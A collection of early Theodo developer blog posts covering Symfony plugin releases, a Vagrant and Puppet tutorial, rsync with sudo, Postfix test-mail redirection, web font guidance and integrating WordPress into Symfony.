Symfttpd with its tools spawn and mksymlinks has been publicly released: https://github.com/laurentb/symfttpd. You can use them to accelerate the deployment of your development environment. As for the small scripts which automate the rest of our needs, we will surely release them in an upcoming post about continuous integration. More about it will follow, so be sure to subcribe!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Laurent Bachelier
  			
  				  			
  		
    
			

									"
"
										Yesterday, December 1st, Theodo had the pleasure to host the improvised first Paris Devops meetup in our new office! Samuel Maftoul and Philippe Müller managed to gather a very interesting and mixed crowd of devs and ops to discuss on the promising ideas that the Devops movement is bringing in the agile develpoment world. Were present:

Sergio Simone
Bruno Michel
Vincent Hardion
Claude Falguière
Ludovic Piot
Alexandre Rodière
Raphaël Pierquin
Philippe Muller
Laurent Bossavit
Samuel Maftoul
Vermeer Grange
Cyrille Le Clerc
François de Metz
Fabrice Bernhard

It was also the occasion to ask Laurent Bossavit to sign his book Gestion de projet : Extreme Programming which is our bible here at Theodo, a great honour 
There were too many subjects and too little time during this first session to really tackle the technologies and ideas behind devops but it was a great occasion to meet diverse people and create a first contact. A very promising start for this new meetup! A big thanks to Samuel Maftoul and Philippe Muller for the initiative and if you want to know more and be informed about the next sessions, join the Paris-devops Google Group.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										As promised during the last symfony live conference, I finally release my current work on a Facebook Connect Plugin for symfony. It is inspired by the good sfFacebookPlugin by Jonathan Todd, which has however been unmaintained for quite some time. Since Facebook’s platform is evolving every week and my focus was not on the Facebook platform but on the Facebook Connect functionality, I decided to create this new plugin.
It is for the moment VERY beta. It is used in two projects, http://www.allomatch.com which is a symfony 1.0/propel project and another project on symfony 1.2/doctrine. It is therefore compatible with both Doctrine and Propel. However some issues remain concerning 1.0 and 1.2 versions regarding some options, the tasks for example.
For the installation, the README is a good start but FAR from complete. I invite you to browse through the code to understand the logic and comment on this post if you have any question regarding installation. This will force me to improve the README.
I intend to improve the documentation in the very near future, so if you are not in a hurry, please wait. However I have already received dozens of mails concerning the current status, so I release it for those who need to start a project using Facebook Connect right now.
Here is the link to the plugin:
http://www.symfony-project.org/plugins/sfFacebookConnectPlugin
And here the presentation made at the sflive conference:
http://www.symfony-live.com/pdf/sflive09fr/theodo-symfony-facebook.pdf

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										This issue might be familiar to some of you: you have ssh access to a server with sudo rights on it and you want to transfer files with rsync. However, since these files are not directly accessible from your ssh user (because they belong to some other user), the rsync fails with
rsync: mkstemp ""XXX"" failed: Permission denied (13)
rsync error: some files could not be transferred (code 23)
if you tried to write a file in a protected directory or
rsync: send_files failed to open ""XXX"": Permission denied (13)
rsync error: some files could not be transferred (code 23)
if you tried to read a protected file.
Here is the simple procedure to solve this problem and transfer the files in one go:

Authenticate with sudo, which by default will cache your authorization for a short time
Then use your favorite transfer program with one small change: use sudo on the remote end

Authenticating with sudo
ssh -t user@host ""sudo -v""
The -v option of sudo option will either give you five more minutes of “free sudoing”, or ask for your password. The -t option of ssh forces an interactive session, so that sudo is able to ask for your password.
If for some reason your password is displayed on your screen, you can run stty -echo before and stty echo after to hide it.
Transferring the file
If you want to get the /root/protected.txt file for example, you will then have to use rsync in the following way:
rsync --rsync-path='sudo rsync' user@host:/root/protected.txt ./
You can use any rsync command as long as you have the correct rsync-path, which by default is just “rsync”.
This tip can work with other programs besides rsync, as long as it lets you change the remote program that will be executed. For instance, you can change the --receive-pack option for git push.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Laurent Bachelier
  			
  				  			
  		
    
			

									"
"
										
December just started, and with it its usual christmas spirit, Santa Claus, happy children and…. the symfony advent calendar!
This year the symfony advent calendar is a collection of articles written by different symfony experts:
http://www.symfony-project.org/blog/2009/12/01/one-more-thing
and is already available as a book on Amazon!
http://www.amazon.com/exec/obidos/ASIN/2918390178
I had the chance to contribute and write an article on developing for Facebook with symfony. This was the perfect occasion to finally sit down and write 15 pages on the experience I gathered on this specific subject. I had already collected it in the sfFacebookConnect plugin but it was lacking documentation. Well here it is finally! At least on Amazon and in a few days as part of the new symfony advent calendar.
Enjoy and do not hesitate to make a critical feedback, the article will be included with the plugin and can still evolve a lot!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										My conference about adopting DevOps philosophy on Symfony projects is now online! You can see (and listen to) me speaking here: http://symfony.com/video/Paris2011/573
In this presentation you will see what I think is the philosophy behind the DevOps movement and how to start with the 4 important aspects of adopting DevOps:

Configuration Management with Puppet
Development on the production environment with Vagrant
Deployment automation with Fabric
Continuous deployment with Jenkins


If you are interested by the DevOps movement and you happen to be in Paris, come to our Paris-DevOps meetups. After the two first meetups hosted by Theodo, the meetup is now traveling to other locations. The next one will be held on the 4th of May at Xebia’s office. More info here: http://parisdevops.fr/

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										I had the chance to spread the good word by talking about adopting DevOps in Symfony projects at the Symfony Live conference. The feedback was very good (for those who attended and have not done so yet, you can give some feedback here: http://joind.in/talk/view/2756) You can also find the slides here: http://www.slideshare.net/mobile/fabrice.bernhard/adopt-devops-philosophy-on-your-symfony-projects and the source code of the slides here: https://github.com/fabriceb/sflive2011-devops)
One of the very good news is that I convinced many people (as observed on twitter) to start using vagrant after the conference. The slides gave a quick introduction, so let me give here a more detailed tutorial on how to start using vagrant.
Introduction to Vagrant
Vagrant is a ruby tool that makes the process of testing your code in a virtual machine VERY easy. You are concerned:

If you are a developer on a complex project with a specific system configuration on the production server that you want to reproduce in your development environment painlessly. This specific system configuration can be specific versions of some packages, a specific architecture or simply a specific OS.
If you are a Mac user! Because the chances that the project you develop will be hosted on a Mac are quite small…

It is quite amazing to see how many people develop on Macs to deploy on Linux systems and don’t use virtual environments. This has two obvious downsides:

you need to install a working development environment on your Mac which can quickly become a pain.
even with PHP applications, which are usually quite platform-independent, it is never truly the case and it is much better to avoid last-minute system-related surprises.

Install Vagrant

Mac OS X

First download VirtualBox 4 http://www.virtualbox.org/wiki/Downloads
Then install the Vagrant gem



sudo gem install vagrant

Debian/Ubuntu

# Install Ruby, Ruby Gems and Vagrant
sudo apt-get install rubygems
sudo apt-get install ruby-dev
sudo apt-get install build-essential
sudo gem install vagrant
# Add the ruby gems path to your path
PATH=$PATH:/var/lib/gems/1.8/bin
# Download and install VirtualBox
echo 'echo ""deb http://download.virtualbox.org/virtualbox/debian maverick contrib"" >> /etc/apt/sources.list' | sudo sh
wget -q http://download.virtualbox.org/virtualbox/debian/oracle_vbox.asc -O- | sudo apt-key add -
sudo apt-get update
sudo apt-get install virtualbox-4.0
sudo apt-get install dkms
You should now be able to type vagrant in your terminal and see the list of tasks that you can do.
$ vagrant
Tasks:
  vagrant box                        # Commands to manage system boxes
  vagrant destroy                    # Destroy the environment, deleting the created virtual machines
  vagrant halt                       # Halt the running VMs in the environment
  vagrant help [TASK]                # Describe available tasks or one specific task
  vagrant init [box_name] [box_url]  # Initializes the current folder for Vagrant usage
  vagrant package                    # Package a Vagrant environment for distribution
  vagrant provision                  # Rerun the provisioning scripts on a running VM
  vagrant reload                     # Reload the environment, halting it then restarting it.
  vagrant resume                     # Resume a suspended Vagrant environment.
  vagrant ssh                        # SSH into the currently running Vagrant environment.
  vagrant ssh_config                 # outputs .ssh/config valid syntax for connecting to this environment via ssh
  vagrant status                     # Shows the status of the current Vagrant environment.
  vagrant suspend                    # Suspend a running Vagrant environment.
  vagrant up                         # Creates the Vagrant environment
  vagrant version                    # Prints the Vagrant version information
Now fetch the base Ubuntu Ludic 32 box provided by Vagrant. This make take a few minutes depending on your connection, since it consists in downloading around 700MB
$ vagrant box add base http://files.vagrantup.com/lucid32.box
Finally, to avoid permission problems with folder sharing between your host machine and your virtual environment, I highly recommend using NFS instead of VBox, which is the default protocol used by VirtualBox.

On Mac OS X, you do not need to do anything, NFS is already installed.
On Debian/Ubuntu, you just need to install the NFS package:

$ sudo apt-get install nfs-common nfs-kernel-server
Test on a first project
I set up a test project so that you can see how it works. Create a new folder called sflive2011vm. We will clone the configuration for our Vagrant Virtual Machine and then clone our actual project inside
$ cd sflive2011vm
$ git clone git://github.com/fabriceb/sfLive2011vm.git .
$ git clone git://github.com/fabriceb/sfLive2011.git
Now all you have to do to test the project is
$ vagrant up
and after a few minutes, Vagrant will have started a virtual Ubuntu, installed all the packages needed and set up tha machine as described in the Puppet manifest. To verify that everything worked as planned just visit http://127.0.0.1:2011/hello/master
That’s it!
Understand Vagrant
Let us now understand more deeply how Vagrant works:
The base box
The base box is simply a saved hard-disk of a Virtual Machine created with VirtualBox. It can contain anything but it needs at least :

Ruby
VirtualBox guest additions
Puppet
Chef

to be boot-strapped by Vagrant and then further configured by a Chef recipe or a Puppet manifest
Vagrantfile
This is the configuration file of Vagrant. The most useful options are port forwarding, provisioning solution (Puppet or Chef) and eventually NFS
Vagrant::Config.run do |config|
  config.vm.box = ""base""
  config.vm.forward_port(""web"", 80, 2011)
  config.vm.provision :puppet
  # config.vm.share_folder(""v-root"", ""/vagrant"", ""."", :nfs => true)
end
Provisioning
The configuration of your VM is coded using Chef or Puppet. This ensures that you will reproduce exactly the same configuration in all your development VMs AND your production environment. Here is the Puppet manifest used in the example:
exec { ""apt-get-update"":
  command => ""apt-get update"",
  path => [""/bin"", ""/usr/bin""],
}

Package {
 ensure => installed,
 require => Exec[""apt-get-update""]
}

class lighttpd
{
  package { ""apache2.2-bin"":
    ensure => absent,
  }

  package { ""lighttpd"":
    ensure => present,
  }

  service { ""lighttpd"":
    ensure => running,
    require => Package[""lighttpd"", ""apache2.2-bin""],
  }

  notice(""Installing Lighttpd"")
}

class lighttpd-phpmysql-fastcgi inherits lighttpd
{

  package { ""php5-cgi"":
    ensure => present,
  }

  package { ""mysql-server"":
    ensure => present,
  }

  exec { ""lighttpd-enable-mod fastcgi"":
    path    => ""/usr/bin:/usr/sbin:/bin"",
    creates => ""/etc/lighttpd/conf-enabled/10-fastcgi.conf"",
    require =>  Package[""php5-cgi""],
  }

  notice(""Installing PHP5 CGI and MySQL"")
}

class symfony-server inherits lighttpd-phpmysql-fastcgi
{

  package { [""php5-cli"", ""php5-sqlite""]:
    ensure => present,
    notify  => Service[""lighttpd""],
  }

  notice(""Installing PHP5 CLI and SQLite"")
}

class symfony-live-server inherits symfony-server
{

  file { ""/etc/lighttpd/conf-available/99-hosts.conf"":
    source => ""/vagrant/files/conf/hosts.conf"",
    notify  => Service[""lighttpd""],
    require => Package[""lighttpd""],
  }

  exec { ""lighttpd-enable-mod hosts"":
    path => ""/usr/bin:/usr/sbin:/bin"",
    creates => ""/etc/lighttpd/conf-enabled/99-hosts.conf"",
    require => File[""/etc/lighttpd/conf-available/99-hosts.conf""],
    notify  => Service[""lighttpd""],
  }

  notice(""Installing and enabling Hosts file"")
}

include symfony-live-server
notice(""Symfony2 server is going live!"")
Take home message

Vagrant is an essential part of the DevOps process: it is the solution to developing, testing and deploying in the same environment. It thus ensures a smoother transition of your project from the dev team to the ops team
Vagrant is EASY. And it is compatible with both Chef and Puppet
Vagrant is a must for Mac developers.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										Fear you will send the unwanted emails to other people when testing your software?
If you use Postfix, you can follow these simple steps:
Put into /etc/postfix/main.cf:
smtp_generic_maps = regexp:/etc/postfix/generic
And into /etc/postfix/generic:
/.*/ laurentb+test@theodo.fr
Reload postfix (this might depend on your distribution):
# /etc/init.d/postfix reload
This will rewrite all emails sent from your machine to send only to the email address provided.
Of course, change the destination email. I get enough emails already!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Laurent Bachelier
  			
  				  			
  		
    
			

									"
"
										
Font usage on the web is a critical matter. Well I guess it’s critical while working with other media too, but if you’re a graphic designer and you’re not that familiar with the best practices of website creation, you might come up with something rude to web designers, be it beautiful or not.
The #1 thing to keep in mind is that text is the core of most websites. In fact, websites are often comparable to newspapers since both media feature categorized articles, with headings, paragraphs, etc. In short: information.
Information also consists of images but here comes rule #2: information must be accessible to anyone. And while text can be accurately reproduced as sound by software known as screen readers (Jaws, Orca, etc.), images can not. Thus, for the blind to access the information transmitted through images we add an “alternative” text description to them, but it’s often limited. We could also put on a more complete description and then hide it to users who can see the image, yet that may require additional work.
Choosing the right fonts
Why, if today’s topic is “Fonts”, am I talking about images? Simply because in order to reproduce some fancy fonts on the web, we have no choice but to use images. Yes, a title reading “My Awesome Website” rendered using a font by Ray Larabie in Adobe Photoshop will not be displayed the same on the end user’s browser if it can’t find the exact same font on the computer.
Solutions? Sure, there are several, as can be seen in this article by Shaun Cronin.To sum up:

some solutions require additional javascript (that impaired users might disable)
others require Adobe Flash (heavy, and disabled by even more people)
most make use of the @font-face property, which is somewhat new and won’t work with obsolete browsers still in use (think Internet Explorer < 9)
the old and dirty solution: using images, meaning that you have to make a new image for every element in each language, and change them all everytime you want to modify the wording. Plus, it won’t resize nicely and need intelligent text alternatives

In addition, Google and other search bots love real text that you can copy/paste so if the text is rendered via an image or a flash object, most of the time these bots won’t catch and index the information… not very SEO friendly.
Therefore I’m sorry to say that (at least until IE 6, 7 and 8 are all below 5% in usage statistics) the best thing to do is to find elegant ways to integrate standard fonts, also referred to as web safe fonts. They simply are the most common fonts to be expected on everybody’s computer. In that bunch you’ll find Arial, Times New Roman, Courier New, then Verdana, and to a lesser extent Georgia, Impact, and some other native Microsoft fonts (sadly…).
Also, you know that fonts can be sorted in 3 categories: serif, sans-serif and monospace fonts.
This is important because web developers/designers will call fonts like this:
font-family: helvetica, arial, sans-serif;
If the font “helvetica” is not found, then it will search for “arial”, and again, if it’s nowhere to be found then it will use the default sans-serif font defined by the browser. Therefore we must ALWAYS list at least 2 fonts: the desired one and the default font type. 3 is better.
So, in addition to working with a limited set of standard fonts, I advise graphic designers to make sure that their layout doesn’t fall apart when switching the font to Arial (a good default sans-serif font) or Times New Roman (a good default serif font). Monospace fonts are mainly used to display code so you should not have to use them a lot, but if you do, then Courier New is a good default monospace font.
If you really need a fancy font, then I would recommend choosing one from Google Web Fonts and/or to provide the said font files along with the rest of your work.
That’s all for the choice of fonts – the big part actually, but there’s more to talk about.
Styling your fonts
Because a font is not only a “font-family” affair, it’s also about the size, the color, the style you give your font.
A rather complete font declaration by a web designer would look like this:
font-family: helvetica, arial, sans-serif;
font-style: bold;
font-size: 12px;
line-height: 16px;
text-transform: uppercase;
color: #000000;
Or in a more compact way:
font: bold 12px/16px helvetica, arial, sans-serif;
text-transform: uppercase;
color: #000000;
One thing you don’t see here because it doesn’t really exist in the web world but does in Photoshop is the anti-aliasing setting (None, Sharp, Crisp, Strong, Smooth). Therefore, I beg you not to use different anti-aliasing levels and to keep it to the Crisp level.
Now, 2 things are important, mainly in order to grant the website a sufficient accessibility level:

consistency
readibility

Consistency means that elements that are to be found in different pages should be identical. For fonts, it implies for instance that the title of the page is always at the same place, using the same font at the same size, with the same color, etc.
At times you may need to lower the size to be able to insert a longer title in the same area. Should this happen, either change all titles or find another solution because this one is not acceptable. Also, you should always take into account this situation where a title or any other text variable could expand beyond the limit of its container, and suggest a solution (such as truncation).
To ensure more visual consistency, please limit yourself to 3 or 4 different font declarations.
All these measures help in not confusing readers and thus improve the readibility of the site. We can do more by making sure the text is actually visible to everyone (rule #2), and this time I’m talking about people who are not blind but still suffer from troubled vision.
For these people, we should ensure that the font size is not ridiculously small (in pixels, I would set the limit to 9) and the contrast between the text and the background is strong enough. There are precise recommendations established by the W3C addressing this concern. And hopefully a lot of tools allow you to check the validity of the chosen colors, such as Colour Contrast Check by Jonathan Snook.
Links are also interesting. One should be able to distinguish a link just by looking at the text, with no need to hover the mouse to find them. To achieve this, it is recommended to apply a different color to links AND to underline them.Alterations in size or style (bold and italic) are to be avoided since these distinctions can apply to normal text as well, with a proper meaning.
Another thing is the letter case. You need not write titles directly in uppercase and should use the “All Caps” transformation in the Character tool panel in Photoshop instead. That’s also what web designers do thanks to the “text-transform” property. This way, we can copy/paste content text in readable form – the real content being the unformatted text, the switch to capital letters is only part of the style, the decoration. Plus, this kind of transformation preserve accents, if needed.
Visualize the site like end users would
Last and not so trivial, I know some of you are crazy about Apple products. It doesn’t matter what my opinion on these are, but it can lead to confusion and frustration since you might present your work to the client, and they will be enthustatic about it – that’s cool. But then we present them with the web rendition of your mockups and they don’t understand why the scrollbars are so ugly compared to what they had seen on the static pages you designed – showing Safari Mac like scrollbars.Same for fonts, that are notoriously “bolder” on a Mac than they are on Linux or Windows – the OS the client and the end users are most expected to use (and thus why you shouldn’t never use the confusing “Strong” anti-aliasing).
So when dealing with fonts, you should preferably:

choose standard fonts
illustrate what happens with shorter/longer text
be consistent
make it readable

I am well aware that the points I make in this article can be regarded as restrictive to your creative spirit but please do not think of them as constraints, they’re meant as guidelines to a more efficient and “web ready” layout, for the World Wide Web to a better place for everyone 


#content #because-we-need-to-redo-the-blog
{
  line-height: 20px;
}
#content #because-we-need-to-redo-the-blog .conclusion
{
  margin-top: 50px;
}
#content #because-we-need-to-redo-the-blog h4
{
  margin-top: 25px;
}
#content #because-we-need-to-redo-the-blog h4,
#content #because-we-need-to-redo-the-blog p,
#content #because-we-need-to-redo-the-blog pre,
#content #because-we-need-to-redo-the-blog ul
{
  margin-bottom: 15px;
}
#content #because-we-need-to-redo-the-blog li
{
  margin-bottom: 10px;
}


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Cyrille Jouineau
  			
  				Cyrille Jouineau - a longtime Theodoer, Cyrille has worked with every version of Symfony and specializes in front-end development (HTML5, CSS3, Twig)  			
  		
    
			

									"
"
										Bienvenue sur le blog de Theodo !
Depuis 2009 Theodo développe des applications web et mobiles sur mesure. Notre équipe de développeurs est spécialisée en Symfony et Angular.js en particulier et plus généralement toutes les technologies de développement web opensource. Quoi de plus normal quand on a la philosophie opensource du partage des connaissances de partager à son tour ses découvertes. C’est le but de ce blog, où nous partageons régulièrement les découvertes techniques ou les astuces des développeurs Theodo.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										sfEasyGMapPlugin 1.0.4 is out and the good news is : the plugin is the 24th most used symfony plugin among the 457 available on http://www.symfony-project.org/plugins/ ! We are now 5 official developers, not counting all the developers I work with who contribute indirectly.
It all started because I was amazed by the success of the Phoogle library on the Internet despite its limited number of functionalities. And since almost all my projects involved a Google Map I wanted to create a plugin containing all the core functionalities I always reuse. Now I am happy to see the popularity of the plugin and am looking forward further possible developments that will continue in the spirit of including as many core functionalities of Google Maps-based application in the plugin.
New functionalities for the moment include :

More precise Mercator projections to convert GPS coordinates into Google Pixel coordinates and back GMapCoord::fromPixToLat, GMapCoord::fromLatToPix, etc.
Added the GMapBounds::getBoundsContainingMarkers(…) function
Added the GMap::centerAndZoomOnMarkers() function which enables to guess zoom and center of the map to fit the markers. Center is easy to guess. Zoom uses width and height of smallest bound, pixel width and height of the map and Mercator projection
Added tomr’s contribution: it is now possible to add multiple controls to the map
Added the GMapCoord::distance($coord1, $coord2) function which gives an estimation of the distance between two coordinates
Added the very useful function $gMap-> getBoundsFromCenterAndZoom(…) which enables one to calculate server-side the bounds corresponding to specific center coordinates, zoom, and map size. This is the equivalent of the client-side map.setCenter(…,…);map.setZoom(…);map.getBounds(); It uses the Mercator projection formulas as used by the Google Maps
A new function $gMapMarker->isInsideBounds($bounds)
A lot of unit tests
And two new samples

Please, feel free to suggest what you consider typical core functionalities of your Google Maps-based applications.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										What better topic to start this technical blog about symfony than to talk about my experience of integrating WordPress into symfony !
I was looking for a nice blogging solution for symfony, and all I found was a very simple plugin and a lot of people encouraging me to build my own blog. Even though it is a nice exercise, my philosophy is to not reinvent the wheel. WordPress is surely the best free blogging tool available, so I preferred to spend time integrating it into my symfony application than to create yet another sfVeryEasyBlogPlugin.
Integrating WordPress into symfony can be done in three steps :

integrating the blog into the application and its layout
merging the authentification system
integrating the blogging information into the symfony application

There is a wiki page handling the last two steps : http://trac.symfony-project.org/wiki/HowToIntegrateWordPressAndBbPressWithSymfony, written by Michael Nolan but I actually concentrated my efforts on the first step for the moment and that is what I will describe.
Integrating WordPress into a symfony application and its layout
Install WordPress
 
We need to store the wordpress files somewhere, I chose to create a new plugin sfWordpressPlugin and put the whole wordpress into the folder

plugins/sfWordpressPlugin/lib/vendor/wordpress

I then created a symbolic link in the web directory called blog pointing to the wordpress directory. That way I was able to run the WordPress configuration and let it create its database

ln -s ../plugins/sfWordpressPlugin/lib/vendor/wordpress web/blog

Create a blog module
We then need a new module, which can be put in the new wordpress plugin and which I called sfWordpress. I enabled it in my frontend application and added the following routing :



blog:
  url:   /blog/*
  param: { module: sfWordpress, action: index }


Create an action that executes WordPress
It now becomes a little tricky. I want to execute WordPress from inside symfony. The goal is to use output_buffering to send the output to the template. I experienced three difficulties :

some actions in WordPress output specific headers, such as feed actions, so their output should be sent directly to the browser and not go through the symfony template
including the wordpress files inside of a function and using buffering to store the output seemed like an easy solution, unless WordPress used a lot of global constants… which is unfortunately the case ! WordPress has some very bad coding habits, they use a dozen of global variable, and some of them have such stupid names as “$name” which means anyone can override them by error (Me for example…)
the __() function of WordPress and symfony are conflicting…

I was able to overcome these difficulties, and here is how my action looks like :

/**
 * intégration de WordPress
 *
 * @param sfWebRequest $request
 * @author fabriceb
 * @since Mar 4, 2009 fabriceb
 */
 public function executeIndex(sfWebRequest $request)
 {
   // Don't load symfony's I18N
   $standard_helpers = sfConfig::get('sf_standard_helpers');
   $standard_helpers = array_diff($standard_helpers, array('I18N'));
   sfConfig::set('sf_standard_helpers', $standard_helpers);

   define('WP_USE_THEMES', true);
   chdir( dirname(__FILE__) . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR . 'lib' . DIRECTORY_SEPARATOR . 'vendor' . DIRECTORY_SEPARATOR . 'wordpress' );
   global $wpdb;
   ob_start();
   require_once( 'wp-blog-header.php' );
   $this->blog = ob_get_contents();
   if (function_exists('is_feed') && is_feed())
   {
     ob_end_flush();
     throw new sfStopException();
   }
   else
   {
     ob_end_clean();
   }
 }

And I had to hack the wp-blog-header.php file to solve the problem of all the global variables :

require_once( dirname(__FILE__) . '/wp-load.php' );

 // @HACK FABRICE
 // All variables defined here are considered global by WordPress
 $local_global_vars = get_defined_vars();
 foreach($local_global_vars as $local_name => $local_value)
 {
   $GLOBALS[$local_name] = $local_value;
 }
 // Don't create new global variables ourselves, and do not overwrite other global variables, for example $name...
 unset($local_name, $local_value, $local_global_vars);
 // @HACK FABRICE

 wp();

 // @HACK Fabrice
 global $posts;
 // @HACK Fabrice

 require_once( ABSPATH . WPINC . '/template-loader.php' );

My only small disappointment for the moment is that I did not solve the I18N conflict, I just avoided it. I will try to come back on this later to fnd a real solution… using namespaces for example ? 
Integrate WordPress view in the symfony view
I created a new theme in my WordPress, based on the default one, which goal was to output only the content of the blog without the layout. It is actually quite easy to do, you just go in each of the php files of the template and you remove all the references to the following functions :

get_header()
get_footer()
get_sidebar()

That way, the output of WordPress stored in the buffer is just the main content stripped out of the layout.
After that, the indexSuccess.php in the sfWordpress module is simple :

< ?php echo $blog ?>

However you still want to include WordPress’s header or sidebar in your own layout. To do that I did the changes directly in my layout.php, as for example in the header :

< ?php if (defined('WP_USE_THEMES') && WP_USE_THEMES): ?>
  < ?php get_header(); ?>
< ?php else: ?>
  < ?php include_http_metas() ?>
  < ?php include_metas() ?>
  < ?php include_title() ?>
< ?php endif; ?>

Or for the sidebar :


  < ?php if (defined('WP_USE_THEMES') && WP_USE_THEMES): ?>
    < ?php get_sidebar(); ?>
  < ?php else : ?>
    < ?php include_component('reference', 'quickList') ?>
  < ?php endif; ?>


Secure the application
It was a big surprise to see that every dynamic WordPress file is actually accessible from the web server. I do not feel at ease with this, and I plan on blocking direct access to any of the files. However for the moment I still see two files that are necessary and I have not yet wrapped inside a symfony action :

wp-comments-post.php which is used to post the comments
xmlrpc.php which is used for the pingbacks

So my philosophy for the moment is to trust WordPress for the frontend files, and block access to all the other directories by including the following .htaccess in each of them :


        AuthUserFile /etc/apache2/.htpasswd
        AuthName ""Admin only""
        AuthType Basic
        require valid-user


Url rewriting
If you enable the url rewriting in WordPress there is actually nothing to do, since the symfony routing already routes any /blog/* url to the WordPress action. However you must be very careful about the .htaccess that WordPress automatically generates and which will break everything !
Therefore I created an empty

plugins/sfWordpressPlugin/lib/vendor/wordpress/.htaccess

owned by root and removed any write access for the user www-data
Conclusion (for the moment)
My plan is to publish very soon the work done in a sfWordpressPlugin and work on the next two steps of integration :

Merging authentication systems

This should be quite easy to do without a hack, since the whole authentication system of WordPress is overridable by a plugin. I think Eric Kittell actually already did it, let us hope it is opensource.

Exchange contents between symfony and WordPress

There are two solutions here, create a schema file for the wordpress database or use the rss file as a web service content provider. Both are interesting.
Please feel free to comment on this work in progress

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
"
										sfEasyGmapPlugin is a very easy to use Google Maps API plugin for symfony, inspired by the Phoogle class… but better 
A very simple version has been available for a few months but I have now finally released the 1.0 version,  with the following new features :
– it is now sf1.2 compatible straight out of the box
– it has some unit tests
– the GMap constructor now takes an array of parameters, which is much more flexible and also more in the symfony coding spirit (Warning : the modification of the GMap constructor should break your application if you used the prior version of sfEasyGMapPlugin)
– there are interesting functions concerning Bounds :
– smallest enclosing bound
– propel criteria “in bounds”
– homothety transformation
– zoomOut transformation
– there are interesting functions concerning conversion from/to lat/lng to/from Google’s pixel coordinates system. These can be very useful if you want to guess the bounds knowing only the center lat/lng, the zoom level and the map’s width/height in pixels. They involve a few mathematical formulas that were not so straightforward, (since you need to understand how Google’s projection works) so trust me, these functions are valuable, even if they only concern power users.
I have also developed a few doctrine-specific functions which are unfortunately not available yet because not generic enough. I will try to release them in the next version.
The official symfony page is here : http://www.symfony-project.org/plugins/sfEasyGMapPlugin
Please feel free to comment on this work in progress !

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Fabrice Bernhard
  			
  				  			
  		
    
			

									"
